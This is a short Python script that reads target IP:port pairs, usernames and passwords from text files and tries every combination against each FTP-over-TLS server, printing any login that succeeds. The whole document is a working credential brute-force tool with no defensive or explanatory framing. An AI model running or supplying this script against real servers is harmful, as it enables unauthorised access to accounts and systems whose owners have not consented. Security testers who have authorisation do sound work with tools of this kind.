from ftplib import FTP_TLS, error_perm

def read_ip_ports(filename):
    with open(filename, 'r') as file:
        return [line.strip().split(':') for line in file.readlines()]

def read_usernames(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def read_passwords(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def test_login(ip, port, username, passwords):
    ftp = FTP_TLS()
    try:
        ftp.connect(ip, int(port))
        ftp.auth()
        ftp.prot_p()

        for password in passwords:
            print(f"Attempting to connect to {ip}:{port} with username: {username} password: {password}")
            try:
                ftp.login(username, password)
                print(f"Login successful for {username} on {ip}:{port}")
                return  # Exit on success
            except error_perm:
                pass  # Ignore failed logins

    except Exception as e:
        print(f"An error occurred for {username} on {ip}:{port}: {e}")
    finally:
        if 'ftp' in locals() and ftp.sock:
            ftp.quit()
            print("Connection closed")

servers = read_ip_ports('ipport.txt')
usernames = read_usernames('usernames.txt')
passwords = read_passwords('passwords.txt')

for ip, port in servers:
    for username in usernames:
        test_login(ip, port, username, passwords)

print("All attempts completed.")
